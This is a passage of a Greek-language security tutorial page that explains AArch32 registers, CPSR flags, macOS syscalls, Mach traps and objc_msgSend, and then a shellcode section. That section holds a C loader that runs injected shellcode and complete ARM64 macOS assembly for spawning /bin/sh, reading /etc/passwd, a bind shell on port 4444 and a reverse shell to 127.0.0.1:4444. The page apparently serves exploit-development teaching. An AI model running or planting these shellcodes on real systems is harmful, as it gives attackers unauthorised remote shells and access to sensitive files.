Σημειώστε ότι η μετάβαση από 64-bit σε 32-bit πραγματοποιείται με μείωση του exception level (για παράδειγμα, ένα πρόγραμμα 64-bit στο EL1 ενεργοποιεί ένα πρόγραμμα στο EL0). Αυτό γίνεται θέτοντας το **bit 4 του** special register **`SPSR_ELx`** **σε 1**, όταν το thread της διεργασίας **`AArch32`** είναι έτοιμο να εκτελεστεί, ενώ το υπόλοιπο του `SPSR_ELx` αποθηκεύει το CPSR του προγράμματος **`AArch32`**. Στη συνέχεια, η privileged διεργασία καλεί την instruction **`ERET`**, ώστε ο processor να μεταβεί στο **`AArch32`**, εισερχόμενος σε A32 ή T32 ανάλογα με το CPSR**.**

Το **`interworking`** πραγματοποιείται χρησιμοποιώντας τα bits J και T του CPSR. Τα `J=0` και `T=0` σημαίνουν **`A32`**, ενώ τα `J=0` και `T=1` σημαίνουν **T32**. Αυτό ουσιαστικά μεταφράζεται στη ρύθμιση του **χαμηλότερου bit σε 1**, για να υποδειχθεί ότι το instruction set είναι T32.\
Αυτό ρυθμίζεται κατά τη διάρκεια των **interworking branch instructions,** αλλά μπορεί επίσης να ρυθμιστεί απευθείας με άλλες instructions, όταν το PC ορίζεται ως destination register. Παράδειγμα:

Ένα ακόμη παράδειγμα:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Καταχωρητές

Υπάρχουν 16 καταχωρητές 32-bit (r0-r15). **Από τον r0 έως τον r14** μπορούν να χρησιμοποιηθούν για **οποιαδήποτε λειτουργία**, ωστόσο ορισμένοι συνήθως δεσμεύονται:

- **`r15`**: Μετρητής προγράμματος (πάντα). Περιέχει τη διεύθυνση της επόμενης εντολής. Στο A32, current + 8, στο T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Σημειώστε ότι το stack είναι πάντα ευθυγραμμισμένο σε όριο 16-byte)
- **`r14`**: Link Register

Επιπλέον, οι καταχωρητές υποστηρίζονται από **`banked registries`**. Πρόκειται για θέσεις που αποθηκεύουν τις τιμές των καταχωρητών και επιτρέπουν την εκτέλεση **fast context switching** κατά τον χειρισμό εξαιρέσεων και σε privileged operations, ώστε να αποφεύγεται η ανάγκη χειροκίνητης αποθήκευσης και επαναφοράς των καταχωρητών κάθε φορά.\
Αυτό γίνεται με την **αποθήκευση της κατάστασης του processor από το `CPSR` στο `SPSR`** του processor mode στο οποίο μεταφέρεται η εξαίρεση. Κατά την επιστροφή από την εξαίρεση, το **`CPSR`** επαναφέρεται από το **`SPSR`**.

### CPSR - Current Program Status Register

Στο AArch32, το CPSR λειτουργεί παρόμοια με το **`PSTATE`** στο AArch64 και αποθηκεύεται επίσης στο **`SPSR_ELx`** όταν λαμβάνει χώρα μια εξαίρεση, ώστε να επαναφέρει αργότερα την εκτέλεση:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Τα πεδία χωρίζονται σε ορισμένες ομάδες:

- Application Program Status Register (APSR): Arithmetic flags, προσβάσιμα από το EL0
- Execution State Registers: Συμπεριφορά της διεργασίας (υπό τη διαχείριση του OS).

#### Application Program Status Register (APSR)

- Τα flags **`N`**, **`Z`**, **`C`**, **`V`** (όπως και στο AArch64)
- Το flag **`Q`**: Ορίζεται σε 1 κάθε φορά που πραγματοποιείται **integer saturation** κατά την εκτέλεση μιας specialized saturating arithmetic instruction. Μόλις οριστεί σε **`1`**, διατηρεί την τιμή του μέχρι να οριστεί χειροκίνητα σε 0. Επιπλέον, δεν υπάρχει κάποια instruction που να ελέγχει implicit την τιμή του· αυτό πρέπει να γίνει με χειροκίνητη ανάγνωσή του.
- Flags **`GE`** (Greater than or equal): Χρησιμοποιούνται σε λειτουργίες SIMD (Single Instruction, Multiple Data), όπως τα "parallel add" και "parallel subtract". Αυτές οι λειτουργίες επιτρέπουν την επεξεργασία πολλών data points σε μία instruction.

Για παράδειγμα, η instruction **`UADD8`** **προσθέτει τέσσερα ζεύγη bytes** (από δύο 32-bit operands) παράλληλα και αποθηκεύει τα αποτελέσματα σε έναν 32-bit register. Στη συνέχεια **ορίζει τα flags `GE` στο `APSR`** με βάση αυτά τα αποτελέσματα. Κάθε flag GE αντιστοιχεί σε μία από τις προσθέσεις bytes και υποδεικνύει αν η πρόσθεση για το συγκεκριμένο ζεύγος bytes **προκάλεσε overflow**.

Η instruction **`SEL`** χρησιμοποιεί αυτά τα flags GE για την εκτέλεση conditional actions.

#### Execution State Registers

- Τα bits **`J`** και **`T`**: Το **`J`** πρέπει να είναι 0 και, αν το **`T`** είναι 0, χρησιμοποιείται το instruction set A32, ενώ αν είναι 1 χρησιμοποιείται το T32.
- **IT Block State Register** (`ITSTATE`): Πρόκειται για τα bits από τις θέσεις 10-15 και 25-26. Αποθηκεύουν conditions για instructions μέσα σε ένα group με prefix **`IT`**.
- Bit **`E`**: Υποδεικνύει το **endianness**.
- **Mode and Exception Mask Bits** (0-4): Καθορίζουν την τρέχουσα κατάσταση εκτέλεσης. Το 5ο υποδεικνύει αν το πρόγραμμα εκτελείται ως 32bit (τιμή 1) ή 64bit (τιμή 0). Τα άλλα 4 αντιπροσωπεύουν το **exception mode** που χρησιμοποιείται αυτήν τη στιγμή (όταν προκύπτει μια εξαίρεση και γίνεται χειρισμός της). Ο αριθμός που έχει οριστεί **υποδεικνύει την τρέχουσα προτεραιότητα** σε περίπτωση που προκληθεί άλλη εξαίρεση ενώ η συγκεκριμένη εξαίρεση βρίσκεται υπό χειρισμό.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Ορισμένες εξαιρέσεις μπορούν να απενεργοποιηθούν χρησιμοποιώντας τα bits **`A`**, `I`, `F`. Αν το **`A`** είναι 1, αυτό σημαίνει ότι θα ενεργοποιούνται **asynchronous aborts**. Το **`I`** ρυθμίζει την απόκριση σε εξωτερικά hardware **Interrupts Requests** (IRQs), ενώ το **F** σχετίζεται με **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Δείτε το [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ή εκτελέστε `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. Τα BSD syscalls θα έχουν **x16 > 0**.

### Mach Traps

Δείτε στο [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) το `mach_trap_table` και στο [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) τα prototypes. Ο μέγιστος αριθμός των Mach traps είναι `MACH_TRAP_TABLE_COUNT` = 128. Τα Mach traps θα έχουν **x16 < 0**, επομένως πρέπει να καλέσετε τους αριθμούς από την προηγούμενη λίστα με ένα **minus**: Το **`_kernelrpc_mach_vm_allocate_trap`** είναι **`-10`**.

Μπορείτε επίσης να ελέγξετε το **`libsystem_kernel.dylib`** σε έναν disassembler, για να βρείτε πώς να καλέσετε αυτά τα (και τα BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Σημείωση ότι τα **Ida** και **Ghidra** μπορούν επίσης να κάνουν decompile **συγκεκριμένα dylibs** από το cache, απλώς περνώντας το cache.

> [!TIP]
> Μερικές φορές είναι ευκολότερο να ελέγξετε τον κώδικα από το **decompiled** **`libsystem_kernel.dylib`** **παρά** να ελέγξετε τον **πηγαίο κώδικα**, επειδή ο κώδικας αρκετών syscalls (BSD και Mach) δημιουργείται μέσω scripts (ελέγξτε τα σχόλια στον πηγαίο κώδικα), ενώ στο dylib μπορείτε να βρείτε τι καλείται.

### Κλήσεις machdep

Το XNU υποστηρίζει έναν ακόμη τύπο κλήσεων που ονομάζονται machine dependent. Οι αριθμοί αυτών των κλήσεων εξαρτώνται από την αρχιτεκτονική και ούτε οι κλήσεις ούτε οι αριθμοί είναι εγγυημένο ότι θα παραμείνουν σταθεροί.

### Σελίδα comm

Αυτή είναι μια σελίδα μνήμης που ανήκει στον kernel και χαρτογραφείται στον χώρο διευθύνσεων κάθε user process. Σκοπός της είναι να κάνει τη μετάβαση από user mode σε kernel space ταχύτερη από τη χρήση syscalls για kernel services που χρησιμοποιούνται τόσο συχνά, ώστε αυτή η μετάβαση να ήταν πολύ inefficent.

Για παράδειγμα, η κλήση `gettimeofdate` διαβάζει την τιμή του `timeval` απευθείας από τη σελίδα comm.

### objc_msgSend

Είναι πολύ συνηθισμένο να βρίσκετε αυτή τη function σε προγράμματα Objective-C ή Swift. Αυτή η function επιτρέπει την κλήση μιας method ενός Objective-C object.

Parameters ([περισσότερες πληροφορίες στα docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> Pointer στο instance
- x1: op -> Selector της method
- x2... -> Οι υπόλοιπες arguments της invoked method

Επομένως, αν βάλετε breakpoint πριν από το branch προς αυτή τη function, μπορείτε εύκολα να βρείτε τι γίνεται invoked στο lldb με (σε αυτό το παράδειγμα, το object καλεί ένα object από το `NSConcreteTask` που θα εκτελέσει μια command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ορίζοντας τη μεταβλητή env **`NSObjCMessageLoggingEnabled=1`**, είναι δυνατή η καταγραφή του πότε καλείται αυτή η function σε ένα αρχείο όπως το `/tmp/msgSends-pid`.
>
> Επιπλέον, ορίζοντας το **`OBJC_HELP=1`** και καλώντας οποιοδήποτε binary, μπορείτε να δείτε άλλες environment variables που μπορείτε να χρησιμοποιήσετε για να **καταγράφετε** πότε συμβαίνουν συγκεκριμένες ενέργειες Objc-C.

Όταν καλείται αυτή η function, είναι απαραίτητο να βρεθεί η called method του υποδεικνυόμενου instance. Για αυτό πραγματοποιούνται διαφορετικές αναζητήσεις:

- Εκτελείται optimistic cache lookup:
- Αν είναι επιτυχές, ολοκληρώνεται
- Αποκτάται το runtimeLock (read)
- Αν (realize && !cls->realized), γίνεται realize η class
- Αν (initialize && !cls->initialized), γίνεται initialize η class
- Δοκιμάζεται το cache της class:
- Αν είναι επιτυχές, ολοκληρώνεται
- Δοκιμάζεται η method list της class:
- Αν βρεθεί, συμπληρώνεται το cache και ολοκληρώνεται
- Δοκιμάζεται το cache της superclass:
- Αν είναι επιτυχές, ολοκληρώνεται
- Δοκιμάζεται η method list της superclass:
- Αν βρεθεί, συμπληρώνεται το cache και ολοκληρώνεται
- Αν (resolver), δοκιμάζεται ο method resolver και επαναλαμβάνεται η διαδικασία από το class lookup
- Αν βρισκόμαστε ακόμη εδώ (= όλα τα υπόλοιπα έχουν αποτύχει), δοκιμάζεται ο forwarder

### Shellcodes

Για μεταγλώττιση:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Για την εξαγωγή των bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Για νεότερες εκδόσεις του macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Κώδικας C για δοκιμή του shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Λήφθηκε από [**εδώ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) και επεξηγείται.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Ανάγνωση με cat

Ο στόχος είναι να εκτελέσουμε `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, επομένως το δεύτερο όρισμα (x1) είναι ένας πίνακας παραμέτρων (ο οποίος στη μνήμη αντιστοιχεί σε μια στοίβα διευθύνσεων).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Εκτέλεση εντολής με sh από ένα fork ώστε να μην τερματιστεί η κύρια διεργασία
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Το Bind shell από [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) στο **port 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Από [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell προς **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Αναφορές

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
